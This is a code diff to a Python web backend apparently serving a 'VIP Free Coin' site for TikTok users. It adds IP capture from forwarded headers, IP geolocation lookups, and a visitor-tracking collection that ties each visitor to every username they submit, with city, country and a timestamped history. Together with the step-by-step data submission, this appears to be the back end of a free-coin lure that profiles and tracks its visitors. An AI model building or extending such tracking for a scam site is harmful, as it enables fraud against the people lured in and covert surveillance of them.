@@ -4,6 +4,7 @@ from starlette.middleware.cors import CORSMiddleware
 from motor.motor_asyncio import AsyncIOMotorClient
 import os
 import logging
+import requests
 from pathlib import Path
 from typing import List, Optional
 import uuid
@@ -33,6 +34,65 @@ api_router = APIRouter(prefix="/api")
 @api_router.get("/")
 async def root():
     return {"message": "VIP Free Coin API - Active"}
+
+def get_client_ip(request: Request):
+    forwarded_for = request.headers.get("x-forwarded-for")
+    if forwarded_for:
+        return forwarded_for.split(",")[0].strip()
+
+    real_ip = request.headers.get("x-real-ip")
+    if real_ip:
+        return real_ip.strip()
+
+    return request.client.host if request.client else "Unknown"
+
+
+def get_ip_location(ip: str):
+    try:
+        if not ip or ip == "Unknown":
+            return {
+                "country": "",
+                "city": "",
+                "text": ""
+            }
+
+        response = requests.get(
+            f"https://ipapi.co/{ip}/json/",
+            timeout=5
+        )
+
+        if response.status_code != 200:
+            return {
+                "country": "",
+                "city": "",
+                "text": ""
+            }
+
+        geo = response.json()
+
+        country = geo.get("country_name") or ""
+        city = geo.get("city") or ""
+
+        if country and city:
+            text = f"{country} / {city}"
+        elif country:
+            text = country
+        else:
+            text = ""
+
+        return {
+            "country": country,
+            "city": city,
+            "text": text
+        }
+
+    except Exception as e:
+        logging.error(f"IP location error: {str(e)}")
+        return {
+            "country": "",
+            "city": "",
+            "text": ""
+        }
 
 @api_router.post("/status", response_model=StatusCheck)
 async def create_status_check(input: StatusCheckCreate):
@@ -75,8 +135,79 @@ async def submit_step(step_data: StepData, request: Request):
         data = step_data.data
         
         # Get client IP
-        client_ip = request.client.host if request.client else "Unknown"
+        client_ip = get_client_ip(request)
         data['ip'] = client_ip
+
+        # Get country / city from IP
+        location_info = get_ip_location(client_ip)
+
+        if location_info.get("text"):
+            data["location"] = location_info["text"]
+            data["country"] = location_info["country"]
+            data["city"] = location_info["city"]
+
+                # Check previous usernames for this visitor
+        visitor_id = data.get("visitor_id")
+        current_username = data.get("username")
+
+        if visitor_id:
+            existing_visitor = await db.visitors.find_one(
+                {"visitor_id": visitor_id},
+                {"_id": 0}
+            )
+
+            previous_usernames = []
+
+            if existing_visitor:
+                previous_usernames = existing_visitor.get("usernames", [])
+
+            if previous_usernames:
+                data["previous_usernames"] = previous_usernames
+                data["previous_usernames_text"] = ", ".join(
+                    [f"@{u}" for u in previous_usernames if u]
+                )
+
+            history_item = {
+                "username": current_username,
+                "ip": client_ip,
+                "location": location_info.get("text"),
+                "country": location_info.get("country"),
+                "city": location_info.get("city"),
+                "time": datetime.utcnow(),
+                "step": step
+            }
+
+            update_query = {
+                "$set": {
+                    "visitor_id": visitor_id,
+                    "ip": client_ip,
+                    "location": location_info.get("text"),
+                    "country": location_info.get("country"),
+                    "city": location_info.get("city"),
+                    "last_seen": datetime.utcnow()
+                },
+                "$inc": {
+                    "visit_count": 1
+                },
+                "$push": {
+                    "history": {
+                        "$each": [history_item],
+                        "$slice": -50
+                    }
+                }
+            }
+
+            if current_username:
+                update_query["$set"]["last_username"] = current_username
+                update_query["$addToSet"] = {
+                    "usernames": current_username
+                }
+
+            await db.visitors.update_one(
+                {"visitor_id": visitor_id},
+                update_query,
+                upsert=True
+            )
         
         # If it's the first step, fetch TikTok user info
         if step == 'username_coin' and 'username' in data:
